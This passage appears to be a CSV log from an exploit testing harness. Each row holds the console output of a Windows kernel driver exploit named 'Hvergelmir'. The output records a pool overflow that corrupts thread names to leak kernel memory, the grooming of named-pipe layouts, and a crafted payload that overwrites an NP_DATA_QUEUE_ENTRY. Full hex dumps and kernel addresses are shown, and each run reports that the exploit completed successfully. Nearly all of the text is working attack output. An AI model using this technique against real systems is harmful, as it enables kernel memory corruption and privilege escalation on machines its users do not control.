    [00000216ECDAD400]  000000C000000001  00000000000000C0
    [00000216ECDAD410]  0000000D45504950  3939393939393939
    [00000216ECDAD420]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=15
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:38:35+00:00,2,15,7,running,running,True,success,0,15.75,True,True,70,30.857,1,65,5,2,"B attempt 4 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 5 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 4 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=104 NpFr=204 pipeBase=200 pipeIndex=1003 capture=1 iosbAttempt=4 pipeAttempt=0 pipeLeak=0
    [000002007514EAB0]  42536F490A100000  2B6FDF62626BB1ED
    [000002007514EAC0]  D4903CE5B811D15D  0000000000000000
    [000002007514EAD0]  0000000000000000  0000000000000000
    [000002007514EAE0]  42536F490E0D0003  0000000000000000
    [000002007514EAF0]  000000000000000C  FFFF970D70B040A0
    [000002007514EB00]  00000000000003E8  6161616161616161
    [000002007514EB10]  6161616161616161  6161616161616161
    [000002007514EB20]  6161616161616161  6161616161616161
    [000002007514EB30]  6161616161616161  6161616161616161
    [000002007514EB40]  6161616161616161  6161616161616161
    [000002007514EB50]  6161616161616161  6161616161616161
    [000002007514EB60]  6161616161616161  6161616161616161
    [000002007514EB70]  6161616161616161  6161616161616161
    [000002007514EB80]  6161616161616161  6161616161616161
    [000002007514EB90]  6161616161616161  6161616161616161
    [000002007514EBA0]  0000000000000000  0000000000000000
    [000002007514EBB0]  7246704E0A100000  2B6FDF62626BB2ED
    [000002007514EBC0]  FFFF970D70B7DA88  FFFF970D70B7DA88
    [000002007514EBD0]  0000000000000000  FFFF970D70C84C60
    [000002007514EBE0]  000000C000000000  00000000000000C0
    [000002007514EBF0]  000003EB45504950  3939393939393939
    [000002007514EC00]  3939393939393939  3939393939393939
    [000002007514EC10]  3939393939393939  3939393939393939
    [000002007514EC20]  3939393939393939  3939393939393939
    [000002007514EC30]  3939393939393939  3939393939393939
    [000002007514EC40]  3939393939393939  3939393939393939
    [000002007514EC50]  3939393939393939  3939393939393939
    [000002007514EC60]  3939393939393939  3939393939393939
    [000002007514EC70]  3939393939393939  3939393939393939
    [000002007514EC80]  3939393939393939  3939393939393939
    [000002007514EC90]  3939393939393939  3939393939393939
    [000002007514ECA0]  3939393939393939  3939393939393939
    [000002007514ECB0]  7246704E0A100000  2B6FDF62626BB3ED
    [000002007514ECC0]  FFFF970D70B7E3E8  FFFF970D70B7E3E8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000002007518E620]  7246704E0A100000  2B6FDF62626BB2ED
    [000002007518E630]  FFFF970D70B7DA88  FFFF970D70B7DA88
    [000002007518E640]  0000020074C70770  FFFF970D70C84C60
    [000002007518E650]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000002007518E610]  0000000000000000  0000000000000000
    [000002007518E620]  7246704E0A100000  2B6FDF62626BB2ED
    [000002007518E630]  FFFF970D70B7DA88  FFFF970D70B7DA88
    [000002007518E640]  0000020074C70770  FFFF970D70C84C60
    [000002007518E650]  000000C000000001  00000000000000C0
    [000002007518E660]  000003EB45504950  3939393939393939
    [000002007518E670]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=17
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:39:09+00:00,2,16,8,running,running,True,success,0,32.047,True,True,3,1.333,1,2,2,2,"IoSB attempt 1 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=508 capture=1 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [000001E00E03D1F0]  42536F490A100000  2B6FDF62645B42AD
    [000001E00E03D200]  D4903CE5B835325D  0000000000000000
    [000001E00E03D210]  0000000000000000  0000000000000000
    [000001E00E03D220]  42536F490E0D0003  0000000000000000
    [000001E00E03D230]  000000000000000C  FFFF970D70B0EB40
    [000001E00E03D240]  00000000000003E8  6161616161616161
    [000001E00E03D250]  6161616161616161  6161616161616161
    [000001E00E03D260]  6161616161616161  6161616161616161
    [000001E00E03D270]  6161616161616161  6161616161616161
    [000001E00E03D280]  6161616161616161  6161616161616161
    [000001E00E03D290]  6161616161616161  6161616161616161
    [000001E00E03D2A0]  6161616161616161  6161616161616161
    [000001E00E03D2B0]  6161616161616161  6161616161616161
    [000001E00E03D2C0]  6161616161616161  6161616161616161
    [000001E00E03D2D0]  6161616161616161  6161616161616161
    [000001E00E03D2E0]  0000000000000000  0000000000000000
    [000001E00E03D2F0]  7246704E0A100000  2B6FDF62645B43AD
    [000001E00E03D300]  FFFF970D70A4B4A8  FFFF970D70A4B4A8
    [000001E00E03D310]  0000000000000000  FFFF970D70503E20
    [000001E00E03D320]  000000C000000000  00000000000000C0
    [000001E00E03D330]  000001FC45504950  3939393939393939
    [000001E00E03D340]  3939393939393939  3939393939393939
    [000001E00E03D350]  3939393939393939  3939393939393939
    [000001E00E03D360]  3939393939393939  3939393939393939
    [000001E00E03D370]  3939393939393939  3939393939393939
    [000001E00E03D380]  3939393939393939  3939393939393939
    [000001E00E03D390]  3939393939393939  3939393939393939
    [000001E00E03D3A0]  3939393939393939  3939393939393939
    [000001E00E03D3B0]  3939393939393939  3939393939393939
    [000001E00E03D3C0]  3939393939393939  3939393939393939
    [000001E00E03D3D0]  3939393939393939  3939393939393939
    [000001E00E03D3E0]  3939393939393939  3939393939393939
    [000001E00E03D3F0]  7246704E0A100000  2B6FDF62645B44AD
    [000001E00E03D400]  FFFF970D70A4C768  FFFF970D70A4C768
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001E00DE9A650]  7246704E0A100000  2B6FDF62645B43AD
    [000001E00DE9A660]  FFFF970D70A4B4A8  FFFF970D70A4B4A8
    [000001E00DE9A670]  000001E00DB90950  FFFF970D70503E20
    [000001E00DE9A680]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001E00DE9A640]  0000000000000000  0000000000000000
    [000001E00DE9A650]  7246704E0A100000  2B6FDF62645B43AD
    [000001E00DE9A660]  FFFF970D70A4B4A8  FFFF970D70A4B4A8
    [000001E00DE9A670]  000001E00DB90950  FFFF970D70503E20
    [000001E00DE9A680]  000000C000000001  00000000000000C0
    [000001E00DE9A690]  000001FC45504950  3939393939393939
    [000001E00DE9A6A0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=37
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:39:13+00:00,2,17,9,running,running,True,success,0,3.281,True,True,1,1.0,1,1,1,1," [*] Starting Hvergelmir Exploit
 [+] Connected to driver successfully!

 [*] Pipe layout attempt 1/24

 [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=504 NpFr=604 pipeBase=600 pipeIndex=998 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [000001DA93ED67A0]  42536F490A100000  2B6FDF62614505ED
    [000001DA93ED67B0]  D4903CE5B990C55D  0000000000000000
    [000001DA93ED67C0]  0000000000000000  0000000000000000
    [000001DA93ED67D0]  42536F490E0D0003  0000000000000000
    [000001DA93ED67E0]  000000000000000C  FFFF970D70B05F00
    [000001DA93ED67F0]  00000000000003E8  6161616161616161
    [000001DA93ED6800]  6161616161616161  6161616161616161
    [000001DA93ED6810]  6161616161616161  6161616161616161
    [000001DA93ED6820]  6161616161616161  6161616161616161
    [000001DA93ED6830]  6161616161616161  6161616161616161
    [000001DA93ED6840]  6161616161616161  6161616161616161
    [000001DA93ED6850]  6161616161616161  6161616161616161
    [000001DA93ED6860]  6161616161616161  6161616161616161
    [000001DA93ED6870]  6161616161616161  6161616161616161
    [000001DA93ED6880]  6161616161616161  6161616161616161
    [000001DA93ED6890]  0000000000000000  0000000000000000
    [000001DA93ED68A0]  7246704E0A100000  2B6FDF62614506ED
    [000001DA93ED68B0]  FFFF970D70B8E108  FFFF970D70B8E108
    [000001DA93ED68C0]  0000000000000000  FFFF970D70C85A40
    [000001DA93ED68D0]  000000C000000000  00000000000000C0
    [000001DA93ED68E0]  000003E645504950  3939393939393939
    [000001DA93ED68F0]  3939393939393939  3939393939393939
    [000001DA93ED6900]  3939393939393939  3939393939393939
    [000001DA93ED6910]  3939393939393939  3939393939393939
    [000001DA93ED6920]  3939393939393939  3939393939393939
    [000001DA93ED6930]  3939393939393939  3939393939393939
    [000001DA93ED6940]  3939393939393939  3939393939393939
    [000001DA93ED6950]  3939393939393939  3939393939393939
    [000001DA93ED6960]  3939393939393939  3939393939393939
    [000001DA93ED6970]  3939393939393939  3939393939393939
    [000001DA93ED6980]  3939393939393939  3939393939393939
    [000001DA93ED6990]  3939393939393939  3939393939393939
    [000001DA93ED69A0]  7246704E0A100000  2B6FDF62614507ED
    [000001DA93ED69B0]  FFFF970D70B92C08  FFFF970D70B92C08
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001DA93E48260]  7246704E0A100000  2B6FDF62614506ED
    [000001DA93E48270]  FFFF970D70B8E108  FFFF970D70B8E108
    [000001DA93E48280]  000001DA938CFA60  FFFF970D70C85A40
    [000001DA93E48290]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001DA93E48250]  0000000000000000  0000000000000000
    [000001DA93E48260]  7246704E0A100000  2B6FDF62614506ED
    [000001DA93E48270]  FFFF970D70B8E108  FFFF970D70B8E108
    [000001DA93E48280]  000001DA938CFA60  FFFF970D70C85A40
    [000001DA93E48290]  000000C000000001  00000000000000C0
    [000001DA93E482A0]  000003E645504950  3939393939393939
    [000001DA93E482B0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:39:18+00:00,2,18,10,running,running,True,success,0,3.219,True,True,2,1.5,1,2,2,1,"SB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=304 NpFr=404 pipeBase=400 pipeIndex=1013 capture=0 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [00000235463626E0]  42536F490A100000  2B6FDF6264ACA8ED
    [00000235463626F0]  D4903CE5B86A485D  0000000000000000
    [0000023546362700]  0000000000000000  0000000000000000
    [0000023546362710]  42536F490E0D0003  0000000000000000
    [0000023546362720]  000000000000000C  FFFF970D6F45B990
    [0000023546362730]  00000000000003E8  6161616161616161
    [0000023546362740]  6161616161616161  6161616161616161
    [0000023546362750]  6161616161616161  6161616161616161
    [0000023546362760]  6161616161616161  6161616161616161
    [0000023546362770]  6161616161616161  6161616161616161
    [0000023546362780]  6161616161616161  6161616161616161
    [0000023546362790]  6161616161616161  6161616161616161
    [00000235463627A0]  6161616161616161  6161616161616161
    [00000235463627B0]  6161616161616161  6161616161616161
    [00000235463627C0]  6161616161616161  6161616161616161
    [00000235463627D0]  0000000000000000  0000000000000000
    [00000235463627E0]  7246704E0A100000  2B6FDF6264ACA9ED
    [00000235463627F0]  FFFF970D70B899C8  FFFF970D70B899C8
    [0000023546362800]  0000000000000000  FFFF970D7061DC20
    [0000023546362810]  000000C000000000  00000000000000C0
    [0000023546362820]  000003F545504950  3939393939393939
    [0000023546362830]  3939393939393939  3939393939393939
    [0000023546362840]  3939393939393939  3939393939393939
    [0000023546362850]  3939393939393939  3939393939393939
    [0000023546362860]  3939393939393939  3939393939393939
    [0000023546362870]  3939393939393939  3939393939393939
    [0000023546362880]  3939393939393939  3939393939393939
    [0000023546362890]  3939393939393939  3939393939393939
    [00000235463628A0]  3939393939393939  3939393939393939
    [00000235463628B0]  3939393939393939  3939393939393939
    [00000235463628C0]  3939393939393939  3939393939393939
    [00000235463628D0]  3939393939393939  3939393939393939
    [00000235463628E0]  7246704E0A100000  2B6FDF6264ACAAED
    [00000235463628F0]  FFFF970D70A44248  FFFF970D70A44248
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000023546362950]  7246704E0A100000  2B6FDF6264ACA9ED
    [0000023546362960]  FFFF970D70B899C8  FFFF970D70B899C8
    [0000023546362970]  0000023545D7FAE0  FFFF970D7061DC20
    [0000023546362980]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000023546362940]  0000000000000000  0000000000000000
    [0000023546362950]  7246704E0A100000  2B6FDF6264ACA9ED
    [0000023546362960]  FFFF970D70B899C8  FFFF970D70B899C8
    [0000023546362970]  0000023545D7FAE0  FFFF970D7061DC20
    [0000023546362980]  000000C000000001  00000000000000C0
    [0000023546362990]  000003F545504950  3939393939393939
    [00000235463629A0]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:39:23+00:00,2,19,11,running,running,True,success,0,3.094,True,True,6,3.5,1,6,6,1,"nLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 5 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 6 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 5 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=804 NpFr=904 pipeBase=900 pipeIndex=11 capture=0 iosbAttempt=5 pipeAttempt=0 pipeLeak=0
    [0000013562E22D60]  42536F490A100000  2B6FDF62601FABED
    [0000013562E22D70]  D4903CE5B9C48B5D  0000000000000000
    [0000013562E22D80]  0000000000000000  0000000000000000
    [0000013562E22D90]  42536F490E0D0003  0000000000000000
    [0000013562E22DA0]  000000000000000C  FFFF970D70B05720
    [0000013562E22DB0]  00000000000003E8  6161616161616161
    [0000013562E22DC0]  6161616161616161  6161616161616161
    [0000013562E22DD0]  6161616161616161  6161616161616161
    [0000013562E22DE0]  6161616161616161  6161616161616161
    [0000013562E22DF0]  6161616161616161  6161616161616161
    [0000013562E22E00]  6161616161616161  6161616161616161
    [0000013562E22E10]  6161616161616161  6161616161616161
    [0000013562E22E20]  6161616161616161  6161616161616161
    [0000013562E22E30]  6161616161616161  6161616161616161
    [0000013562E22E40]  6161616161616161  6161616161616161
    [0000013562E22E50]  0000000000000000  0000000000000000
    [0000013562E22E60]  7246704E0A100000  2B6FDF62601FACED
    [0000013562E22E70]  FFFF970D70A7B388  FFFF970D70A7B388
    [0000013562E22E80]  0000000000000000  FFFF970D6E5F8220
    [0000013562E22E90]  000000C000000000  00000000000000C0
    [0000013562E22EA0]  0000000B45504950  3939393939393939
    [0000013562E22EB0]  3939393939393939  3939393939393939
    [0000013562E22EC0]  3939393939393939  3939393939393939
    [0000013562E22ED0]  3939393939393939  3939393939393939
    [0000013562E22EE0]  3939393939393939  3939393939393939
    [0000013562E22EF0]  3939393939393939  3939393939393939
    [0000013562E22F00]  3939393939393939  3939393939393939
    [0000013562E22F10]  3939393939393939  3939393939393939
    [0000013562E22F20]  3939393939393939  3939393939393939
    [0000013562E22F30]  3939393939393939  3939393939393939
    [0000013562E22F40]  3939393939393939  3939393939393939
    [0000013562E22F50]  3939393939393939  00000000FDFDFDFD
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000013562E1CD70]  7246704E0A100000  2B6FDF62601FACED
    [0000013562E1CD80]  FFFF970D70A7B388  FFFF970D70A7B388
    [0000013562E1CD90]  00000135629709B0  FFFF970D6E5F8220
    [0000013562E1CDA0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000013562E1CD60]  0000000000000000  0000000000000000
    [0000013562E1CD70]  7246704E0A100000  2B6FDF62601FACED
    [0000013562E1CD80]  FFFF970D70A7B388  FFFF970D70A7B388
    [0000013562E1CD90]  00000135629709B0  FFFF970D6E5F8220
    [0000013562E1CDA0]  000000C000000001  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:39:27+00:00,2,20,12,running,running,True,success,0,3.297,True,True,3,2.0,1,3,3,1,"=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 3 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 2 leak 4
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=4 NpFr=104 pipeBase=100 pipeIndex=987 capture=0 iosbAttempt=2 pipeAttempt=0 pipeLeak=0
    [000002206A07DA40]  42536F490A100000  2B6FDF6261B9EDED
    [000002206A07DA50]  D4903CE5B8B97D5D  0000000000000000
    [000002206A07DA60]  0000000000000000  0000000000000000
    [000002206A07DA70]  42536F490E0D0003  0000000000000000
    [000002206A07DA80]  000000000000000C  FFFF970D70B0BD50
    [000002206A07DA90]  00000000000003E8  6161616161616161
    [000002206A07DAA0]  6161616161616161  6161616161616161
    [000002206A07DAB0]  6161616161616161  6161616161616161
    [000002206A07DAC0]  6161616161616161  6161616161616161
    [000002206A07DAD0]  6161616161616161  6161616161616161
    [000002206A07DAE0]  6161616161616161  6161616161616161
    [000002206A07DAF0]  6161616161616161  6161616161616161
    [000002206A07DB00]  6161616161616161  6161616161616161
    [000002206A07DB10]  6161616161616161  6161616161616161
    [000002206A07DB20]  6161616161616161  6161616161616161
    [000002206A07DB30]  0000000000000000  0000000000000000
    [000002206A07DB40]  7246704E0A100000  2B6FDF6261B9EEED
    [000002206A07DB50]  FFFF970D70B7A608  FFFF970D70B7A608
    [000002206A07DB60]  0000000000000000  FFFF970D7061E040
    [000002206A07DB70]  000000C000000000  00000000000000C0
    [000002206A07DB80]  000003DB45504950  3939393939393939
    [000002206A07DB90]  3939393939393939  3939393939393939
    [000002206A07DBA0]  3939393939393939  3939393939393939
    [000002206A07DBB0]  3939393939393939  3939393939393939
    [000002206A07DBC0]  3939393939393939  3939393939393939
    [000002206A07DBD0]  3939393939393939  3939393939393939
    [000002206A07DBE0]  3939393939393939  3939393939393939
    [000002206A07DBF0]  3939393939393939  3939393939393939
    [000002206A07DC00]  3939393939393939  3939393939393939
    [000002206A07DC10]  3939393939393939  3939393939393939
    [000002206A07DC20]  3939393939393939  3939393939393939
    [000002206A07DC30]  3939393939393939  3939393939393939
    [000002206A07DC40]  7246704E0A100000  2B6FDF6261B9EFED
    [000002206A07DC50]  FFFF970D70A7E088  FFFF970D70A7E088
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000002206A07DCB0]  7246704E0A100000  2B6FDF6261B9EEED
    [000002206A07DCC0]  FFFF970D70B7A608  FFFF970D70B7A608
    [000002206A07DCD0]  0000022069A6F960  FFFF970D7061E040
    [000002206A07DCE0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000002206A07DCA0]  0000000000000000  0000000000000000
    [000002206A07DCB0]  7246704E0A100000  2B6FDF6261B9EEED
    [000002206A07DCC0]  FFFF970D70B7A608  FFFF970D70B7A608
    [000002206A07DCD0]  0000022069A6F960  FFFF970D7061E040
    [000002206A07DCE0]  000000C000000001  00000000000000C0
    [000002206A07DCF0]  000003DB45504950  3939393939393939
    [000002206A07DD00]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
